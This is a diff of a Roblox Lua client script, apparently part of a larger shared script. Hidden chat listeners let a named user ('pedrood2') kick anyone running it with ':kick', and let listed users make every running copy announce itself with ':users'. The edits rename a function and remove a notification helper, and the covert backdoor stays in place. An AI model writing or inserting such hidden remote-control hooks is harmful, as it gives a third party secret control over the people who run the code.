@@ -24,7 +24,7 @@ local sigmas = {
 local alpha = ":users"
 
 -- Verificar si un usuario es admin
-local function isAdmin(name)
+local function admins(name)
     for _, admin in ipairs(sigmas) do 
         if admin:lower() == name:lower() then
             return true
@@ -33,7 +33,7 @@ local function isAdmin(name)
     return false
 end
 
--- Ejecutar kick (código existente)
+-- Ejecutar kick
 local function executeKick(targetPlayer)
     local player = game.Players.LocalPlayer
     wait(0.1)
@@ -82,26 +82,24 @@ end
 
 -- Manejar mensajes del chat
 local function onChatMessage(player, message)
-    -- Comando ":users" solo para usuarios en sigmas (excepto pedrood2)
-    if message:lower() == alpha:lower() and isAdmin(player.Name) and player.Name:lower() ~= "pedrood2" then
+    -- Comando ":users"
+    if message:lower() == alpha:lower() and admins(player.Name) then
         for _, sigmaUser in ipairs(sigmas) do
-            if sigmaUser:lower() ~= "pedrood2" then
-                local sigmaPlayer = findPlayerByName(sigmaUser)
-                if sigmaPlayer then
-                    local args = {
-                        [1] = ">>> HII!",
-                        [2] = "All"
-                    }
-                    game:GetService("ReplicatedStorage")
-                        :WaitForChild("DefaultChatSystemChatEvents")
-                        :WaitForChild("SayMessageRequest")
-                        :FireServer(unpack(args))
-                end
+            local sigmaPlayer = findPlayerByName(sigmaUser)
+            if sigmaPlayer then
+                local args = {
+                    [1] = ">>> HII!",
+                    [2] = "All"
+                }
+                game:GetService("ReplicatedStorage")
+                    :WaitForChild("DefaultChatSystemChatEvents")
+                    :WaitForChild("SayMessageRequest")
+                    :FireServer(unpack(args))
             end
         end
     end
 
-    -- Comando ":kick" solo para pedrood2
+    -- Comando ":kick" reservado para pedrood2
     if message:sub(1, 5):lower() == ":kick" and player.Name:lower() == "pedrood2" then
         local partialName = message:sub(7):lower()
         local targetPlayer = findPlayerByName(partialName)
@@ -135,16 +133,6 @@ for _, player in ipairs(players:GetPlayers()) do
     player.Chatted:Connect(function(message)
         onChatMessage(player, message)
     end)
-end
-
-
--- Función para mostrar una notificación
-local function showNotification(title, text, duration)
-    StarterGui:SetCore("SendNotification", {
-        Title = title;
-        Text = text;
-        Duration = duration; -- Duración en segundos
-    })
 end
 
 local function GetChar()
